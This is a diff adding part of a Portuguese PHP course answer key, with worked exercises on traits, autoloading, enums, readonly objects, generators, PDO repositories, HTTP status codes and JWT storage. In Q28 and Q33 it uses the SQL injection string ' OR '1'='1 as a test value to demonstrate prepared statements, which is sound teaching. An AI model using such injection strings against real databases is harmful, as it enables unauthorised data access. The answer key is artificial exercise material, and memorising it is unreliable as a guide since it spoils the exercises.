+    printf("%-37s 1 kg/R$ 50: %5.2f | 4 kg/R$ 250: %5.2f\n", $nome, $e-&gt;calcular(1, "SP", 50), $e-&gt;calcular(4, "SP", 250));
+}</code></pre>
+<pre class="saida"><code>fixo                                  1 kg/R$ 50: 15.00 | 4 kg/R$ 250: 15.00
+por peso                              1 kg/R$ 50: 12.00 | 4 kg/R$ 250: 20.00
+grátis acima de 200 (sobre por peso) 1 kg/R$ 50: 12.00 | 4 kg/R$ 250:  0.00</code></pre>
+<p>A interface ganhou o <code>$valorPedido</code> porque o <em>decorator</em> precisa dele: um contrato evolui com as estratégias, e é melhor perceber isso cedo. O <em>decorator</em> <code>FreteGratisAcimaDe</code> <strong>implementa</strong> a mesma interface e <strong>envolve</strong> outra estratégia: pode envolver qualquer uma, inclusive outro <em>decorator</em>, sem criar subclasses para cada combinação. O código que usa o frete continua recebendo só um <code>CalculoFrete</code>.</p>
+<p>Repare que a última linha saiu desalinhada por uma coluna: o <code>%-37s</code> do <code>printf</code> conta <strong>bytes</strong>, e o "á" de "grátis" ocupa dois. É o mesmo problema do <code>strlen</code> do módulo 1; para alinhar texto com acentos, complete com <code>mb_str_pad</code> (PHP 8.3) antes de imprimir.</p>
+<div class="questao" id="q19">
+<span class="num">Q19</span>
+<div class="corpo">
+<p class="titulo">Uma trait de timestamps</p>
+<p>Escreva a trait <code>TemTimestamps</code>, com as propriedades <code>criadoEm</code> e <code>atualizadoEm</code> (<code>DateTimeImmutable</code>) e os métodos <code>marcarCriacao()</code> e <code>tocar()</code>, e use-a em <code>Produto</code> e <code>Cliente</code>. Use um relógio fixo (uma função que devolve sempre a mesma data) para que a saída seja previsível.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+trait TemTimestamps
+{
+    private ?DateTimeImmutable $criadoEm = null;
+    private ?DateTimeImmutable $atualizadoEm = null;
+
+    public function marcarCriacao(DateTimeImmutable $agora): void
+    {
+        $this-&gt;criadoEm = $this-&gt;atualizadoEm = $agora;
+    }
+
+    public function tocar(DateTimeImmutable $agora): void
+    {
+        $this-&gt;atualizadoEm = $agora;
+    }
+
+    public function descreverDatas(): string
+    {
+        return sprintf("criado %s, atualizado %s", $this-&gt;criadoEm?-&gt;format("d/m H:i"), $this-&gt;atualizadoEm?-&gt;format("d/m H:i"));
+    }
+}
+
+final class Produto
+{
+    use TemTimestamps;
+    public function __construct(public string $nome) {}
+}
+
+final class Cliente
+{
+    use TemTimestamps;
+    public function __construct(public string $email) {}
+}
+
+$inicio = new DateTimeImmutable("2026-03-10 09:00");
+$p = new Produto("Vidas Secas");
+$p-&gt;marcarCriacao($inicio);
+$p-&gt;tocar($inicio-&gt;modify("+2 days 3 hours"));
+
+$c = new Cliente("ana@exemplo.com");
+$c-&gt;marcarCriacao($inicio-&gt;modify("+1 hour"));
+
+echo "Produto: ", $p-&gt;descreverDatas(), "\n";
+echo "Cliente: ", $c-&gt;descreverDatas(), "\n";
+echo "Produto usa a trait? ", in_array(TemTimestamps::class, class_uses($p), true) ? "sim" : "não", "\n";</code></pre>
+<pre class="saida"><code>Produto: criado 10/03 09:00, atualizado 12/03 12:00
+Cliente: criado 10/03 10:00, atualizado 10/03 10:00
+Produto usa a trait? sim</code></pre>
+<p>Passar o "agora" como parâmetro, em vez de chamar <code>new DateTimeImmutable()</code> dentro da trait, é o que torna o código <strong>testável</strong>: nos testes, o tempo é fixo; em produção, quem chama passa a hora atual (ou um relógio PSR-20, <code>ClockInterface</code>). O <code>DateTimeImmutable</code> devolve um objeto novo a cada <code>modify</code>, sem alterar o original; com o <code>DateTime</code> mutável, o <code>$inicio</code> mudaria a cada <code>modify</code> e as datas sairiam erradas.</p>
+<div class="questao" id="q20">
+<span class="num">Q20</span>
+<div class="corpo">
+<p class="titulo">Autoload PSR-4 sem Composer</p>
+<p>Para entender o que o Composer faz, escreva um <em>autoloader</em> PSR-4 com <code>spl_autoload_register</code> que mapeie o <em>namespace</em> <code>Livraria\</code> para a pasta <code>src/</code>. Crie, a partir do próprio programa, as classes <code>Livraria\Dominio\Livro</code> e <code>Livraria\Servicos\Catalogo</code> em arquivos separados, e use-as sem nenhum <code>require</code> delas.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+// Cria a estrutura de pastas e arquivos que, num projeto real, já existiria.
+@mkdir("src/Dominio", 0777, true);
+@mkdir("src/Servicos", 0777, true);
+file_put_contents("src/Dominio/Livro.php", &lt;&lt;&lt;'PHP'
+&lt;?php
+namespace Livraria\Dominio;
+
+final class Livro
+{
+    public function __construct(public readonly string $titulo, public readonly float $preco) {}
+}
+PHP);
+file_put_contents("src/Servicos/Catalogo.php", &lt;&lt;&lt;'PHP'
+&lt;?php
+namespace Livraria\Servicos;
+
+use Livraria\Dominio\Livro;
+
+final class Catalogo
+{
+    /** @var list&lt;Livro&gt; */
+    private array $livros = [];
+    public function adicionar(Livro $l): void { $this-&gt;livros[] = $l; }
+    public function maisBarato(): ?Livro
+    {
+        $ordenados = $this-&gt;livros;
+        usort($ordenados, fn($a, $b) =&gt; $a-&gt;preco &lt;=&gt; $b-&gt;preco);
+        return $ordenados[0] ?? null;
+    }
+}
+PHP);
+
+spl_autoload_register(function (string $classe): void {
+    $prefixo = "Livraria\\";
+    if (!str_starts_with($classe, $prefixo)) {
+        return;  // não é nossa: deixa para outro autoloader
+    }
+    $relativo = substr($classe, strlen($prefixo));
+    $arquivo = __DIR__ . "/src/" . str_replace("\\", "/", $relativo) . ".php";
+    echo "  [autoload] $classe -&gt; src/", str_replace("\\", "/", $relativo), ".php\n";
+    if (is_file($arquivo)) {
+        require $arquivo;
+    }
+});
+
+use Livraria\Dominio\Livro;
+use Livraria\Servicos\Catalogo;
+
+$cat = new Catalogo();
+$cat-&gt;adicionar(new Livro("Vidas Secas", 49.9));
+$cat-&gt;adicionar(new Livro("Iracema", 25.0));
+echo "Mais barato: ", $cat-&gt;maisBarato()?-&gt;titulo, "\n";</code></pre>
+<pre class="saida"><code>  [autoload] Livraria\Servicos\Catalogo -&gt; src/Servicos/Catalogo.php
+  [autoload] Livraria\Dominio\Livro -&gt; src/Dominio/Livro.php
+Mais barato: Iracema</code></pre>
+<p>Cada classe é carregada <strong>só na primeira vez em que é usada</strong>, e na ordem do uso: o <code>Catalogo</code> antes do <code>Livro</code>, porque é criado antes. A regra PSR-4 é só isso: prefixo do <em>namespace</em> → pasta base, e o resto do nome → caminho do arquivo. O Composer gera o mesmo mapeamento a partir de <code>"autoload": {"psr-4": {"Livraria\\": "src/"}}</code>; com <code>composer dump-autoload -o</code>, ele gera também um mapa de classes, que evita consultar o disco. O <code>@</code> antes do <code>mkdir</code> só silencia o aviso quando a pasta já existe.</p>
+</section>
+<section class="modulo" id="modulo-3">
+<h2><span class="rotulo">MÓDULO 3</span> PHP moderno: exceções, interfaces e traits avançados e o PHP 8.x</h2>
+<p class="intro">Hierarquias de exceções, interfaces da SPL, traits com conflitos e métodos abstratos, e os recursos do PHP 8.0 ao 8.5: enums, readonly, match, property hooks e o pipe.</p>
+<p class="aulas-titulo">Artigos 16 a 19</p>
+<ul class="aulas">
+<li><span class="n">#16</span> Exceções Avançadas</li>
+<li><span class="n">#17</span> Interfaces Avançadas</li>
+<li><span class="n">#18</span> Traits Avançados</li>
+<li><span class="n">#19</span> PHP 8.x Moderno</li>
+</ul>
+<h3>Perguntas conceituais — respostas</h3>
+<div class="questao" id="q21">
+<span class="num">Q21</span>
+<div class="corpo">
+<p class="titulo">Enums com comportamento</p>
+<p>O que um <code>enum StatusPedido: string</code> (<em>backed enum</em>) oferece a mais que um conjunto de constantes <code>const PAGO = 'pago'</code>? Para que servem <code>from</code> e <code>tryFrom</code>?</p>
+</div>
+</div>
+<p>Com constantes, um parâmetro <code>string $status</code> aceita qualquer texto, inclusive <code>"pgo"</code>. Com <code>StatusPedido $status</code>, só os casos do enum passam, e o erro aparece no <strong>tipo</strong>, verificado pelo PHP. Um enum também pode ter <strong>métodos</strong> (<code>$status-&gt;rotulo()</code>, <code>$status-&gt;podeIrPara($outro)</code>), implementar interfaces e listar os casos com <code>cases()</code>. O <em>backed enum</em> associa cada caso a um valor escalar (<code>case Pago = 'pago';</code>), que é o que vai para o banco e para o JSON. O <code>from('pago')</code> converte de volta e lança <code>ValueError</code> para valor desconhecido; o <code>tryFrom</code> devolve <code>null</code>. Use <code>tryFrom</code> para dados externos (formulário, JSON), tratando o <code>null</code>, e <code>from</code> onde um valor inválido é um bug.</p>
+<div class="questao" id="q22">
+<span class="num">Q22</span>
+<div class="corpo">
+<p class="titulo">readonly e imutabilidade</p>
+<p>O que garante uma propriedade <code>readonly</code>? Por que um objeto <code>readonly</code> que contém um array de objetos ainda pode mudar "por dentro"? O que o PHP 8.5 trouxe para criar cópias alteradas?</p>
+</div>
+</div>
+<p>Uma propriedade <code>readonly</code> só pode ser inicializada <strong>uma vez</strong>, de dentro da classe (normalmente no construtor); qualquer nova atribuição lança <code>Error</code>. A garantia é <strong>rasa</strong>: se a propriedade guarda um objeto, a <strong>referência</strong> é fixa, mas o objeto apontado continua mutável (<code>$pedido-&gt;cliente-&gt;email = '...'</code> funciona se <code>Cliente</code> não for imutável). Um array <code>readonly</code> não pode ser alterado, mas os objetos dentro dele podem. Para a imutabilidade valer de verdade, os objetos internos também precisam ser imutáveis. Para criar uma cópia com um campo diferente, era preciso o padrão <code>withX()</code> reconstruindo o objeto; o PHP 8.5 trouxe o <code>clone($objeto, ['preco' =&gt; 10])</code>, que clona e altera propriedades na mesma operação, inclusive as <code>readonly</code>.</p>
+<div class="questao" id="q23">
+<span class="num">Q23</span>
+<div class="corpo">
+<p class="titulo">Property hooks</p>
+<p>O PHP 8.4 trouxe os <em>property hooks</em>. Mostre como uma propriedade <code>public string $email</code> pode normalizar o valor (minúsculas, sem espaços) a cada escrita, sem <em>getter</em> nem <em>setter</em>. Que vantagem isso tem sobre os métodos <code>setEmail()</code>?</p>
+</div>
+</div>
+<pre class="codigo"><code>public string $email {
+    set(string $valor) {
+        $this-&gt;email = strtolower(trim($valor));
+    }
+}</code></pre>
+<p>O <em>hook</em> <code>set</code> roda a cada atribuição (<code>$cliente-&gt;email = " Ana@X.com "</code>), e quem usa a classe continua escrevendo e lendo a propriedade normalmente. A vantagem sobre <code>setEmail()</code> é que a classe pode <strong>começar</strong> com uma propriedade pública simples e ganhar a regra depois, sem mudar nenhum código que a usa. Antes dos <em>hooks</em>, a prudência obrigava a escrever <em>getters</em> e <em>setters</em> desde o primeiro dia, por precaução. Há também o <em>hook</em> <code>get</code>, para propriedades calculadas (<code>public string $nomeCompleto { get =&gt; "$this-&gt;nome $this-&gt;sobrenome"; }</code>).</p>
+<h3>Exercícios de código — respostas</h3>
+<div class="questao" id="q24">
+<span class="num">Q24</span>
+<div class="corpo">
+<p class="titulo">Um enum de status com regras</p>
+<p>Escreva <code>enum StatusPedido: string</code> com os casos <code>Novo</code>, <code>Pago</code>, <code>Enviado</code>, <code>Entregue</code> e <code>Cancelado</code>, o método <code>rotulo()</code> (texto para a tela) e o método <code>podeIrPara(self $novo): bool</code> com as transições permitidas (Novo → Pago ou Cancelado; Pago → Enviado ou Cancelado; Enviado → Entregue). Converta textos vindos de um formulário com <code>tryFrom</code>, incluindo um inválido.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+enum StatusPedido: string
+{
+    case Novo = 'novo';
+    case Pago = 'pago';
+    case Enviado = 'enviado';
+    case Entregue = 'entregue';
+    case Cancelado = 'cancelado';
+
+    public function rotulo(): string
+    {
+        return match ($this) {
+            self::Novo =&gt; 'Aguardando pagamento',
+            self::Pago =&gt; 'Pagamento confirmado',
+            self::Enviado =&gt; 'A caminho',
+            self::Entregue =&gt; 'Entregue',
+            self::Cancelado =&gt; 'Cancelado',
+        };
+    }
+
+    public function podeIrPara(self $novo): bool
+    {
+        return in_array($novo, match ($this) {
+            self::Novo =&gt; [self::Pago, self::Cancelado],
+            self::Pago =&gt; [self::Enviado, self::Cancelado],
+            self::Enviado =&gt; [self::Entregue],
+            self::Entregue, self::Cancelado =&gt; [],
+        }, true);
+    }
+}
+
+foreach (StatusPedido::cases() as $destino) {
+    printf("Pago -&gt; %-9s %s\n", $destino-&gt;value, StatusPedido::Pago-&gt;podeIrPara($destino) ? "permitido" : "negado");
+}
+
+foreach (['enviado', 'extraviado'] as $doFormulario) {
+    $s = StatusPedido::tryFrom($doFormulario);
+    echo $doFormulario, ": ", $s?-&gt;rotulo() ?? "status desconhecido", "\n";
+}</code></pre>
+<pre class="saida"><code>Pago -&gt; novo      negado
+Pago -&gt; pago      negado
+Pago -&gt; enviado   permitido
+Pago -&gt; entregue  negado
+Pago -&gt; cancelado permitido
+enviado: A caminho
+extraviado: status desconhecido</code></pre>
+<p>O <code>match ($this)</code> sem braço padrão é <strong>exaustivo</strong> na prática: se um caso novo for acrescentado ao enum e esquecido aqui, a chamada lança <code>UnhandledMatchError</code> em vez de devolver algo errado (e analisadores como o PHPStan acusam antes de rodar). O operador <code>?-&gt;</code> encadeia sobre <code>null</code> com segurança, e o <code>??</code> dá o texto padrão.</p>
+<div class="questao" id="q25">
+<span class="num">Q25</span>
+<div class="corpo">
+<p class="titulo">Objeto imutável com clone with</p>
+<p>Escreva <code>final readonly class Preco</code> com <code>centavos</code> e <code>moeda</code>, validação no construtor (não negativo, moeda de 3 letras maiúsculas) e os métodos <code>comDesconto(int $percentual): static</code>, usando o <code>clone</code> com propriedades do PHP 8.5, e <code>formatado()</code>. Mostre que o original não muda e que a validação continua valendo.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+final readonly class Preco
+{
+    public function __construct(public int $centavos, public string $moeda = 'BRL')
+    {
+        if ($centavos &lt; 0) {
+            throw new InvalidArgumentException("preço negativo: $centavos");
+        }
+        if (!preg_match('/^[A-Z]{3}$/', $moeda)) {
+            throw new InvalidArgumentException("moeda inválida: $moeda");
+        }
+    }
+
+    public function comDesconto(int $percentual): static
+    {
+        return clone($this, ['centavos' =&gt; intdiv($this-&gt;centavos * (100 - $percentual), 100)]);
+    }
+
+    public function formatado(): string
+    {
+        return $this-&gt;moeda . ' ' . number_format($this-&gt;centavos / 100, 2, ',', '.');
+    }
+}
+
+$cheio = new Preco(4990);
+$promo = $cheio-&gt;comDesconto(20);
+echo $cheio-&gt;formatado(), " -&gt; ", $promo-&gt;formatado(), "\n";
+
+try {
+    $cheio-&gt;centavos = 1;
+} catch (Error $e) {
+    echo get_class($e), ": ", $e-&gt;getMessage(), "\n";
+}
+try {
+    new Preco(100, 'real');
+} catch (InvalidArgumentException $e) {
+    echo "recusado: ", $e-&gt;getMessage(), "\n";
+}</code></pre>
+<pre class="saida"><code>BRL 49,90 -&gt; BRL 39,92
+Error: Cannot modify readonly property Preco::$centavos
+recusado: moeda inválida: real</code></pre>
+<p>O <code>clone($this, [...])</code> cria a cópia já com o novo valor, inclusive numa propriedade <code>readonly</code>, que um <code>clone</code> seguido de atribuição não permitiria. Atenção: ele <strong>não</strong> passa pelo construtor, então a validação dele não roda na cópia. Aqui não há risco, porque um desconto de 0 a 100% nunca deixa o preço negativo; com regras mais delicadas, o <code>comDesconto</code> deve chamar <code>new static(...)</code>. O <code>intdiv</code> mantém os centavos inteiros: com <code>float</code>, 4990 × 0,8 já dá 3992,0000000000005.</p>
+<div class="questao" id="q26">
+<span class="num">Q26</span>
+<div class="corpo">
+<p class="titulo">Iteradores e Countable</p>
+<p>Escreva <code>final class Carrinho implements IteratorAggregate, Countable</code> que guarde itens (título e quantidade), possa ser percorrido com <code>foreach</code> por meio de um gerador (<code>yield</code>) e contado com <code>count()</code>. Acrescente um método gerador <code>itensAcimaDe(int $qtd)</code> e mostre que nada é calculado até o <code>foreach</code> pedir.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+final class Carrinho implements IteratorAggregate, Countable
+{
+    /** @var array&lt;string, int&gt; */
+    private array $itens = [];
+
+    public function adicionar(string $titulo, int $qtd = 1): void
+    {
+        $this-&gt;itens[$titulo] = ($this-&gt;itens[$titulo] ?? 0) + $qtd;
+    }
+
+    public function getIterator(): Generator
+    {
+        yield from $this-&gt;itens;
+    }
+
+    public function count(): int
+    {
+        return array_sum($this-&gt;itens);
+    }
+
+    public function itensAcimaDe(int $qtd): Generator
+    {
+        foreach ($this-&gt;itens as $titulo =&gt; $q) {
+            echo "  (examinando $titulo)\n";
+            if ($q &gt; $qtd) {
+                yield $titulo =&gt; $q;
+            }
+        }
+    }
+}
+
+$c = new Carrinho();
+$c-&gt;adicionar("Vidas Secas");
+$c-&gt;adicionar("Iracema", 3);
+$c-&gt;adicionar("Vidas Secas", 2);
+
+foreach ($c as $titulo =&gt; $qtd) {
+    echo "$titulo: $qtd\n";
+}
+echo "total de exemplares: ", count($c), "\n";
+
+$gerador = $c-&gt;itensAcimaDe(2);
+echo "gerador criado, nada examinado ainda\n";
+foreach ($gerador as $titulo =&gt; $qtd) {
+    echo "acima de 2: $titulo ($qtd)\n";
+    break;  // parou no primeiro: o resto nunca é examinado
+}</code></pre>
+<pre class="saida"><code>Vidas Secas: 3
+Iracema: 3
+total de exemplares: 6
+gerador criado, nada examinado ainda
+  (examinando Vidas Secas)
+acima de 2: Vidas Secas (3)</code></pre>
+<p>Implementar as interfaces da SPL faz um objeto se comportar como os tipos nativos: <code>foreach</code> e <code>count()</code> funcionam nele. Um método com <code>yield</code> não executa nada quando chamado; devolve um <code>Generator</code>, que roda o corpo aos poucos, a cada pedido do <code>foreach</code>. Com o <code>break</code>, o segundo item nem é examinado. É o mesmo mecanismo que permite ler um arquivo de 2 GB linha a linha sem carregá-lo na memória.</p>
+<div class="questao" id="q27">
+<span class="num">Q27</span>
+<div class="corpo">
+<p class="titulo">Traits com conflito e método abstrato</p>
+<p>Duas traits, <code>Registravel</code> e <code>Notificavel</code>, têm um método <code>enviar()</code>. Use as duas na classe <code>Pedido</code>, resolvendo o conflito com <code>insteadof</code> e <code>as</code>. Faça uma das traits exigir, por um método abstrato, que a classe tenha <code>identificador(): string</code>.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+trait Registravel
+{
+    abstract public function identificador(): string;  // quem usa a trait precisa fornecer
+
+    public function enviar(): string
+    {
+        return "log: " . $this-&gt;identificador() . " registrado";
+    }
+}
+
+trait Notificavel
+{
+    public function enviar(): string
+    {
+        return "e-mail: aviso enviado";
+    }
+}
+
+final class Pedido
+{
+    use Registravel, Notificavel {
+        Registravel::enviar insteadof Notificavel;  // enviar() é o da Registravel
+        Notificavel::enviar as notificar;           // o outro continua disponível com outro nome
+    }
+
+    public function __construct(private int $id) {}
+
+    public function identificador(): string
+    {
+        return "pedido #{$this-&gt;id}";
+    }
+}
+
+$p = new Pedido(42);
+echo $p-&gt;enviar(), "\n";
+echo $p-&gt;notificar(), "\n";</code></pre>
+<pre class="saida"><code>log: pedido #42 registrado
+e-mail: aviso enviado</code></pre>
+<p>Sem o bloco <code>insteadof</code>, o PHP recusa a classe com um erro fatal: ele não escolhe sozinho entre dois métodos de mesmo nome. O método abstrato numa trait é a forma de declarar uma dependência dela: sem <code>identificador()</code>, a classe nem compila. Mesmo assim, o exemplo mostra o limite das traits: o nome <code>enviar</code> não diz nada, e a solução mais clara seria compor objetos (<code>Logger</code> e <code>Notificador</code>) em vez de misturar comportamentos.</p>
+</section>
+<section class="modulo" id="modulo-4">
+<h2><span class="rotulo">MÓDULO 4</span> Banco de dados, APIs e testes</h2>
+<p class="intro">PDO, prepared statements e o padrão Repository, query builder e migrations, Eloquent, APIs REST, autenticação JWT e testes com PHPUnit.</p>
+<p class="aulas-titulo">Artigos 20 a 25</p>
+<ul class="aulas">
+<li><span class="n">#20</span> PDO Avançado, Prepared Statements e Padrão Repository</li>
+<li><span class="n">#21</span> Query Builder e Migrations</li>
+<li><span class="n">#22</span> ORM com Eloquent</li>
+<li><span class="n">#23</span> APIs REST com PHP</li>
+<li><span class="n">#24</span> Autenticação JWT</li>
+<li><span class="n">#25</span> Testes Automatizados com PHPUnit</li>
+</ul>
+<h3>Perguntas conceituais — respostas</h3>
+<div class="questao" id="q28">
+<span class="num">Q28</span>
+<div class="corpo">
+<p class="titulo">Prepared statements</p>
+<p>Explique por que um <em>prepared statement</em> impede SQL injection mesmo quando o valor contém aspas. A opção <code>PDO::ATTR_EMULATE_PREPARES</code> muda essa garantia?</p>
+</div>
+</div>
+<p>No <em>prepared statement</em>, o comando (<code>SELECT * FROM livros WHERE autor = ?</code>) e os valores são enviados <strong>separadamente</strong>: o banco analisa e planeja o comando antes de conhecer os valores, que entram depois como dados, nunca como SQL. Um valor <code>' OR '1'='1</code> é procurado literalmente como nome de autor. Com <code>ATTR_EMULATE_PREPARES</code> ligado (o padrão do driver MySQL), o PDO monta o comando no lado do PHP, escapando os valores com as regras do conjunto de caracteres da conexão. Continua seguro <strong>desde que</strong> o <em>charset</em> esteja na DSN (<code>charset=utf8mb4</code>), e não definido depois com <code>SET NAMES</code>. Desligar a emulação usa os <em>prepared statements</em> nativos do servidor e devolve números com o tipo certo, em vez de strings.</p>
+<div class="questao" id="q29">
+<span class="num">Q29</span>
+<div class="corpo">
+<p class="titulo">Repository</p>
+<p>O que o padrão Repository esconde do resto da aplicação? Por que o método <code>LivroRepository::buscarPorAutor(string $autor): array</code> é melhor do que espalhar o SQL pelos controladores?</p>
+</div>
+</div>
+<p>O Repository esconde <strong>como</strong> os objetos são guardados e recuperados: SQL, tabelas, <em>joins</em>, conversão de linha para objeto. O resto da aplicação pede coleções de objetos do domínio, numa linguagem do negócio (<code>buscarPorAutor</code>). Com o SQL espalhado, mudar uma coluna exige caçar todas as consultas; a mesma consulta aparece repetida com pequenas diferenças; e testar um controlador exige um banco. Com o Repository, há um lugar só para cada consulta, e uma interface (<code>LivroRepositoryInterface</code>) permite trocar a implementação por uma em memória nos testes. É exatamente o que este site faz em <code>app/Repositories/</code>.</p>
+<div class="questao" id="q30">
+<span class="num">Q30</span>
+<div class="corpo">
+<p class="titulo">Migrations</p>
+<p>Por que um projeto versiona as mudanças de esquema como <em>migrations</em> numeradas, em vez de manter só um <code>schema.sql</code> atualizado à mão? O que uma tabela de controle registra?</p>
+</div>
+</div>
+<p>O <code>schema.sql</code> descreve o <strong>estado final</strong>, mas um banco em produção já tem dados e está num estado <strong>anterior</strong>: para chegar ao novo, é preciso saber exatamente quais alterações faltam aplicar. As <em>migrations</em> são passos ordenados (<code>007_cria_downloads.sql</code>, <code>008_adiciona_slug.sql</code>), versionados junto com o código: cada ambiente (a máquina de cada desenvolvedor, o CI, a produção) aplica os que ainda não aplicou, na mesma ordem, e todos chegam ao mesmo esquema. A tabela de controle (<code>migrations</code>) registra quais já foram aplicadas e quando. Uma migration já aplicada em produção <strong>nunca</strong> é editada: corrige-se com uma nova.</p>
+<div class="questao" id="q31">
+<span class="num">Q31</span>
+<div class="corpo">
+<p class="titulo">Status HTTP de uma API</p>
+<p>Que código HTTP a API da livraria deve devolver em cada caso, e por quê? (a) livro criado; (b) livro removido; (c) JSON malformado no corpo; (d) campos válidos como JSON, mas preço negativo; (e) <em>token</em> ausente; (f) <em>token</em> válido de um usuário sem permissão; (g) livro inexistente.</p>
+</div>
+</div>
+<ul><li>(a) <strong>201 Created</strong>, com o cabeçalho <code>Location</code> apontando para o novo recurso.</li><li>(b) <strong>204 No Content</strong>: deu certo e não há corpo a devolver.</li><li>(c) <strong>400 Bad Request</strong>: a requisição nem pôde ser entendida.</li><li>(d) <strong>422 Unprocessable Content</strong>: a requisição foi entendida, mas viola as regras (muitas APIs usam 400 para os dois casos, o que também é aceitável, se for consistente).</li><li>(e) <strong>401 Unauthorized</strong>: "não sei quem você é" (o nome é histórico: significa <em>não autenticado</em>).</li><li>(f) <strong>403 Forbidden</strong>: "sei quem você é, e você não pode".</li><li>(g) <strong>404 Not Found</strong>.</li></ul>
+<p>Devolver 200 com <code>{"erro": ...}</code> no corpo quebra <em>proxies</em>, caches, monitoramento e clientes, que olham o código para decidir o que fazer.</p>
+<div class="questao" id="q32">
+<span class="num">Q32</span>
+<div class="corpo">
+<p class="titulo">Onde guardar o JWT no navegador</p>
+<p>Uma SPA recebe um JWT após o login. Compare guardá-lo no <code>localStorage</code> e num <em>cookie</em> <code>HttpOnly; Secure; SameSite=Strict</code>, quanto a XSS e CSRF.</p>
+</div>
+</div>
+<ul><li>**<code>localStorage</code><strong>: qualquer JavaScript da página consegue lê-lo. Uma falha de </strong>XSS** (um script injetado) rouba o <em>token</em> e o envia para o atacante, que passa a agir como o usuário de qualquer lugar, até o <em>token</em> expirar. Em compensação, não há CSRF: o navegador não envia o <code>localStorage</code> sozinho.</li><li>**Cookie <code>HttpOnly</code><strong>: o JavaScript </strong>não<strong> consegue lê-lo, e o XSS não o rouba (embora ainda possa fazer requisições em nome do usuário enquanto a página estiver aberta). Como o navegador envia o <em>cookie</em> sozinho, volta o risco de </strong>CSRF**, que o <code>SameSite=Strict</code> (ou <code>Lax</code>) e um <em>token antiforgery</em> resolvem.</li></ul>
+<p>Para aplicações web, o <em>cookie</em> <code>HttpOnly</code> é a opção mais segura. Em qualquer caso, <em>tokens</em> de curta duração limitam o estrago.</p>
+<h3>Exercícios de código — respostas</h3>
+<div class="questao" id="q33">
+<span class="num">Q33</span>
+<div class="corpo">
+<p class="titulo">PDO com SQLite e um Repository</p>
+<p>Crie um banco SQLite em memória com a tabela <code>livros</code>, um <code>final readonly class Livro</code> e um <code>LivroRepository</code> com <code>salvar(Livro): int</code> (devolve o id), <code>buscarPorId(int): ?Livro</code> e <code>buscarPorAutor(string): array</code>, usando <em>prepared statements</em> e <code>FETCH_ASSOC</code>. Mostre que um nome de autor com aspas não quebra a consulta.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+final readonly class Livro
+{
+    public function __construct(public ?int $id, public string $titulo, public string $autor, public int $precoCentavos) {}
+}
+
+final class LivroRepository
+{
+    public function __construct(private PDO $pdo) {}
+
+    public function salvar(Livro $l): int
+    {
+        $st = $this-&gt;pdo-&gt;prepare("INSERT INTO livros (titulo, autor, preco_centavos) VALUES (:titulo, :autor, :preco)");
+        $st-&gt;execute(["titulo" =&gt; $l-&gt;titulo, "autor" =&gt; $l-&gt;autor, "preco" =&gt; $l-&gt;precoCentavos]);
+        return (int) $this-&gt;pdo-&gt;lastInsertId();
+    }
+
+    public function buscarPorId(int $id): ?Livro
+    {
+        $st = $this-&gt;pdo-&gt;prepare("SELECT * FROM livros WHERE id = ?");
+        $st-&gt;execute([$id]);
+        $linha = $st-&gt;fetch();
+        return $linha ? $this-&gt;hidratar($linha) : null;
+    }
+
+    /** @return list&lt;Livro&gt; */
+    public function buscarPorAutor(string $autor): array
+    {
+        $st = $this-&gt;pdo-&gt;prepare("SELECT * FROM livros WHERE autor = ? ORDER BY titulo");
+        $st-&gt;execute([$autor]);
+        return array_map($this-&gt;hidratar(...), $st-&gt;fetchAll());
+    }
+
+    private function hidratar(array $l): Livro
+    {
+        return new Livro((int) $l["id"], $l["titulo"], $l["autor"], (int) $l["preco_centavos"]);
+    }
+}
+
+$pdo = new PDO("sqlite::memory:", options: [
+    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
+    PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
+]);
+$pdo-&gt;exec("CREATE TABLE livros (id INTEGER PRIMARY KEY, titulo TEXT NOT NULL, autor TEXT NOT NULL, preco_centavos INTEGER NOT NULL)");
+
+$repo = new LivroRepository($pdo);
+$id = $repo-&gt;salvar(new Livro(null, "Dom Casmurro", "Machado de Assis", 3500));
+$repo-&gt;salvar(new Livro(null, "Quincas Borba", "Machado de Assis", 3800));
+$repo-&gt;salvar(new Livro(null, "O Auto da Barca", "Gil Vicente d'Ouro", 2000));
+
+echo "id $id: ", $repo-&gt;buscarPorId($id)?-&gt;titulo, "\n";
+echo "id 99: ", $repo-&gt;buscarPorId(99)?-&gt;titulo ?? "não encontrado", "\n";
+foreach ($repo-&gt;buscarPorAutor("Machado de Assis") as $l) {
+    echo "Machado: {$l-&gt;titulo}\n";
+}
+echo "Com aspas: ", count($repo-&gt;buscarPorAutor("Gil Vicente d'Ouro")), " livro(s)\n";
+echo "Injeção: ", count($repo-&gt;buscarPorAutor("' OR '1'='1")), " livro(s)\n";</code></pre>
+<pre class="saida"><code>id 1: Dom Casmurro
+id 99: não encontrado
+Machado: Dom Casmurro
+Machado: Quincas Borba
+Com aspas: 1 livro(s)
+Injeção: 0 livro(s)</code></pre>
+<p>O <code>ERRMODE_EXCEPTION</code> (padrão desde o PHP 8) faz qualquer erro de SQL lançar <code>PDOException</code>, em vez de devolver <code>false</code> em silêncio. A "injeção" devolve 0 livros: o texto foi procurado como nome de autor. O <code>$this-&gt;hidratar(...)</code> é a sintaxe de <em>callable</em> de primeira classe (PHP 8.1), mais segura que a string <code>"hidratar"</code>, porque o nome é conferido pelo PHP. Para trocar o SQLite pelo MySQL, muda só a DSN e o tipo da chave primária no <code>CREATE TABLE</code>.</p>
+<div class="questao" id="q34">
+<span class="num">Q34</span>
+<div class="corpo">
+<p class="titulo">Um executor de migrations</p>
